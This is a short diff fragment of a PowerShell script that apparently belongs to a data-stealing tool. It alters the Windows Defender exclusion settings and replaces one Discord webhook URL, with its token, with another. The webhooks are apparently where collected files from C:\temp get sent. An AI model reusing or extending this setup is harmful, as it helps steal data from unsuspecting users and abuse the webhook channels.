@@ -1,6 +1,6 @@
 Remove-MpPreference -ExclusionPath “C:”
 $hookurl='https://discord.com/api/webhooks/1201175701563383979/fmbj3ItMmfq79ds-7vVtgDD28nUqY3RfpN72t6LZsJs9dXG3nHeRlgk_Eyzq_5UMK8v9'
-$hookurl2='https://discord.com/api/webhooks/1189972666506039399/noWdQFFczREOMIlEBSeX4kwfMaDTRr7rSAWD9_kgG--ZeM8wf4MxIds88dGQYoPl9wOq'
+$hookurl2='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
 $fileSaveDir = 'C:\temp'
 $date = get-date
 $filename = 'j'
